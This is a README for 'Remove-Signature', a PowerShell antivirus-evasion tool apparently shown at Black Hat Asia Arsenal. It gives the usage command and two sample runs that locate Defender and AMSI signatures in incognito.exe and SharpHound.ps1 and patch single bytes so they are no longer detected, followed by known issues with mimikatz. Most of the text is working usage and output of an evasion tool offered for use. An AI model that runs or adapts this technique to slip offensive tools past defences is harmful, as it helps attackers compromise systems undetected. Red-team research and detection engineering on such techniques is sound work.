# Remove-Signature

Remove-Signature is a powershell-based tool designed to automate the process of generating a payload that can bypass anti-virus detection. 

https://www.blackhat.com/asia-23/arsenal/schedule/index.html#remove-signature-31139

## Usage

```
. '.\Remove-Signature.ps1' ; Remove-Signature -Path .\incognito.exe -AvProduct Amsi
```

* -Path: filepath
* -Force (optional) : remove signature even if it is at .text section or .idata(import name table) section
* -AvProduct (optional): av product to use for signature scanning, Defender (default) or Amsi, Kaspersky(Beta version)
  * recommended to choose Amsi since it's faster.

```
PS C:\> . '.\Remove-Signature.ps1' ; Remove-Signature -Path .\incognito.exe
[*] C:\incognito.exe has malicious signature. start removing all of them...
[*] scanning 102912 bytes
..............................................
[*] located a signature around 0001679a

0001671a 74 69 6e 67 20 74 6f 20 61 64 64 20 75 73 65 72 ting to add user
0001672a 20 25 73 20 74 6f 20 67 72 6f 75 70 20 25 73 20  %s to group %s
0001673a 6f 6e 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 6f on domain contro
0001674a 6c 6c 65 72 20 25 73 0a 00 00 4e 54 20 41 55 54 ller %s   NT AUT
0001675a 48 4f 52 49 54 59 5c 41 4e 4f 4e 59 4d 4f 55 53 HORITY\ANONYMOUS
0001676a 20 4c 4f 47 4f 4e 00 00 00 00 5b 2b 5d 20 53 75  LOGON    [+] Su
0001677a 63 63 65 73 73 66 75 6c 6c 79 20 61 64 64 65 64 ccessfully added
0001678a 20 75 73 65 72 20 74 6f 20 67 72 6f 75 70 0a 00  user to group
0001679a 00 00 5b 2d 5d 20 43 6f 6d 70 75 74 65 72 20 6e   [-] Computer n
000167aa 61 6d 65 20 69 6e 76 61 6c 69 64 0a 00 00 5b 2d ame invalid   [-
000167ba 5d 20 4f 70 65 72 61 74 69 6f 6e 20 6f 6e 6c 79 ] Operation only
000167ca 20 61 6c 6c 6f 77 65 64 20 6f 6e 20 70 72 69 6d  allowed on prim
000167da 61 72 79 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 ary domain contr
000167ea 6f 6c 6c 65 72 0a 00 00 00 00 5b 2d 5d 20 53 70 oller     [-] Sp
000167fa 65 63 69 61 6c 20 67 72 6f 75 70 0a 00 00 5b 2d ecial group   [-
0001680a 5d 20 55 73 65 72 20 6e 6f 74 20 66 6f 75 6e 64 ] User not found
[*] should be changed as follow to bypass the signature

0001671a 74 69 6e 67 20 74 6f 20 61 64 64 20 75 73 65 72 ting to add user
0001672a 20 25 73 20 74 6f 20 67 72 6f 75 70 20 25 73 20  %s to group %s
0001673a 6f 6e 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 6f on domain contro
0001674a 6c 6c 65 72 20 25 73 0a 00 00 4e 54 20 41 55 54 ller %s   NT AUT
0001675a 48 4f 52 49 54 59 5c 41 4e 4f 4e 59 4d 4f 55 53 HORITY\ANONYMOUS
0001676a 20 4c 4f 47 4f 4e 00 00 00 00 5b 2b 5d 20 53 75  LOGON    [+] Su
0001677a 63 63 65 73 73 66 75 6c 6c 79 20 61 64 64 65 64 ccessfully added
0001678a 20 75 73 65 72 20 74 6f 20 67 72 6f 75 70 41 00  user to groupA
0001679a 00 00 5b 2d 5d 20 43 6f 6d 70 75 74 65 72 20 6e   [-] Computer n
000167aa 61 6d 65 20 69 6e 76 61 6c 69 64 0a 00 00 5b 2d ame invalid   [-
000167ba 5d 20 4f 70 65 72 61 74 69 6f 6e 20 6f 6e 6c 79 ] Operation only
000167ca 20 61 6c 6c 6f 77 65 64 20 6f 6e 20 70 72 69 6d  allowed on prim
000167da 61 72 79 20 64 6f 6d 61 69 6e 20 63 6f 6e 74 72 ary domain contr
000167ea 6f 6c 6c 65 72 0a 00 00 00 00 5b 2d 5d 20 53 70 oller     [-] Sp
000167fa 65 63 69 61 6c 20 67 72 6f 75 70 0a 00 00 5b 2d ecial group   [-
0001680a 5d 20 55 73 65 72 20 6e 6f 74 20 66 6f 75 6e 64 ] User not found
[+] removed all signatures. here is the output: C:\incognito.exe.bypassed
```

```
PS C:\Users\david\Desktop\tool> Remove-Signature -Path .\SharpHound.ps1 -AvProduct Amsi
[*] SharpHound.ps1 has malicious signature. start scanning 1318097 bytes...
......
[*] located a signature around 00141cba

00141c3a 4d 65 74 68 6f 64 28 22 41 74 74 61 63 68 22 2c Method("Attach",
00141c4a 20 24 42 69 6e 64 69 6e 67 46 6c 61 67 73 29 2e  $BindingFlags).
00141c5a 49 6e 76 6f 6b 65 28 24 4e 75 6c 6c 2c 20 40 28 Invoke($Null, @(
00141c6a 29 29 0a 09 24 41 73 73 65 6d 62 6c 79 2e 47 65 ))  $Assembly.Ge
00141c7a 74 54 79 70 65 28 22 53 68 61 72 70 68 6f 75 6e tType("Sharphoun
00141c8a 64 2e 50 72 6f 67 72 61 6d 22 29 2e 47 65 74 4d d.Program").GetM
00141c9a 65 74 68 6f 64 28 22 49 6e 76 6f 6b 65 53 68 61 ethod("InvokeSha
00141caa 72 70 48 6f 75 6e 64 22 29 2e 49 6e 76 6f 6b 65 rpHound").Invoke
00141cba 28 24 4e 75 6c 6c 2c 20 40 28 2c 24 70 61 73 73 ($Null, @(,$pass
00141cca 65 64 29 29 0a 7d 0a
[*] should be changed as follow to bypass the signature

00141c3a 4d 65 74 68 6f 64 28 22 41 74 74 61 63 68 22 2c Method("Attach",
00141c4a 20 24 42 69 6e 64 69 6e 67 46 6c 61 67 73 29 2e  $BindingFlags).
00141c5a 49 6e 76 6f 6b 65 28 24 4e 75 6c 6c 2c 20 40 28 Invoke($Null, @(
00141c6a 29 29 0a 09 24 41 73 73 65 6d 62 6c 79 2e 47 65 ))  $Assembly.Ge
00141c7a 74 54 79 70 65 28 22 53 68 61 72 70 68 6f 75 6e tType("Sharphoun
00141c8a 64 2e 50 72 6f 67 72 61 6d 22 29 2e 47 65 74 4d d.Program").GetM
00141c9a 65 74 68 6f 64 28 22 49 6e 76 6f 6b 65 53 68 61 ethod("InvokeSha
00141caa 72 70 48 6f 75 6e 64 22 29 2e 49 6e 76 6f 6b 41 rpHound").InvokA
00141cba 28 24 4e 75 6c 6c 2c 20 40 28 2c 24 70 61 73 73 ($Null, @(,$pass
00141cca 65 64 29 29 0a 7d 0a
[+] removed all signatures. here is the output: C:\Users\david\Desktop\tool\bypassed.SharpHound.ps1
```

## Demo

[https://www.youtube.com/watch?v=7jtHYQ8kGCw](https://www.youtube.com/watch?v=1pQVQR1jjE8)

## Known Issues

* cannot output bypassed version of mimikats
  * Defender has signatures in its import name table. If import table is modified to bypass the detection, mimikatz won't be launched properly.
* when Defender Cloud Protection is enabled, binaries with managed code tend to be detected. 
